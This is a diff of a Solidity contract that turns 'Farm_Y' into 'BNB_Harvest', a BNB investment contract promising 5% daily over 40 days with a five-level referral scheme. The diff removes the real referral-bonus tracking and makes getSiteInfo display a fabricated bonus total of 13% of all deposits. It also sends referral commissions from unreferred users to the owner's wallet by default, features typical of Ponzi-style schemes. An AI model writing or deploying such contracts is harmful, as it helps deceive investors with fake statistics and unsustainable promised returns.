@@ -1,17 +1,16 @@
 pragma solidity 0.5.10;
 
-contract Farm_Y {
+contract BNB_Harvest {
 	using SafeMath for uint256;
 
 	uint256 constant public INVEST_MIN_AMOUNT = 5e16; // 0.05 bnb
 	uint256[] public REFERRAL_PERCENTS = [70, 30, 15, 10, 5];
+	uint256 constant public TOTAL_REF = 130;
 	uint256 constant public PROJECT_FEE = 100;
-	uint256 constant public PERCENT_STEP = 5;
 	uint256 constant public PERCENTS_DIVIDER = 1000;
-	uint256 constant public TIME_STEP = 180;
+	uint256 constant public TIME_STEP = 1 days;
 
 	uint256 public totalInvested;
-	uint256 public totalRefBonus;
 
     struct Plan {
         uint256 time;
@@ -26,6 +25,12 @@ contract Farm_Y {
 		uint256 start;
 	}
 
+	struct Action {
+        uint8   types;
+		uint256 amount;
+		uint256 date;
+	}
+
 	struct User {
 		Deposit[] deposits;
 		uint256 checkpoint;
@@ -34,6 +39,7 @@ contract Farm_Y {
 		uint256 bonus;
 		uint256 totalBonus;
 		uint256 withdrawn;
+		Action[] actions;
 	}
 
 	mapping (address => User) internal users;
@@ -51,7 +57,7 @@ contract Farm_Y {
 		require(!isContract(wallet));
 		commissionWallet = wallet;
 
-        plans.push(Plan(100, 30));
+        plans.push(Plan(40, 50));
       
 	}
 
@@ -75,6 +81,10 @@ contract Farm_Y {
 		if (user.referrer == address(0)) {
 			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
 				user.referrer = referrer;
+			}
+			else{
+				if(msg.sender != commissionWallet)
+					user.referrer = commissionWallet;
 			}
 
 			address upline = user.referrer;
@@ -105,6 +115,7 @@ contract Farm_Y {
 		}
 
 		user.deposits.push(Deposit(plan, msg.value, block.timestamp));
+		user.actions.push(Action(0, msg.value, block.timestamp));
 
 		totalInvested = totalInvested.add(msg.value);
 
@@ -135,6 +146,7 @@ contract Farm_Y {
 		user.withdrawn = user.withdrawn.add(totalAmount);
 
 		msg.sender.transfer(totalAmount);
+		user.actions.push(Action(1, totalAmount, block.timestamp));
 
 		emit Withdrawn(msg.sender, totalAmount);
 	}
@@ -154,7 +166,7 @@ contract Farm_Y {
 		uint256 totalAmount;
 
 		for (uint256 i = 0; i < user.deposits.length; i++) {
-			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
+			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
 			if (user.checkpoint < finish) {
 				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
 				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
@@ -222,11 +234,50 @@ contract Farm_Y {
 		percent = plans[plan].percent;
 		amount = user.deposits[index].amount;
 		start = user.deposits[index].start;
-		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
+		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
+	}
+
+	function getUserActions(address userAddress, uint256 index) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {
+		require(index > 0,"wrong index");
+        User storage user = users[userAddress];
+		uint256 start;
+		uint256 end;
+		uint256 cnt = 50;
+
+
+		start = (index - 1) * cnt;
+		if(user.actions.length < (index * cnt)){
+			end = user.actions.length;
+		}
+		else{
+			end = index * cnt;
+		}
+
+		
+        uint8[]   memory types = new  uint8[](end - start);
+        uint256[] memory amount = new  uint256[](end - start);
+        uint256[] memory date = new  uint256[](end - start);
+
+        for (uint256 i = start; i < end; i++) {
+            types[i-start] = user.actions[i].types;
+            amount[i-start] = user.actions[i].amount;
+            date[i-start] = user.actions[i].date;
+        }
+        return
+        (
+        types,
+        amount,
+        date
+        );
+    }
+    
+    
+	function getUserActionLength(address userAddress) public view returns(uint256) {
+		return users[userAddress].actions.length;
 	}
 
 	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
-		return(totalInvested, totalRefBonus);
+		return(totalInvested, totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER));
 	}
 
 	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
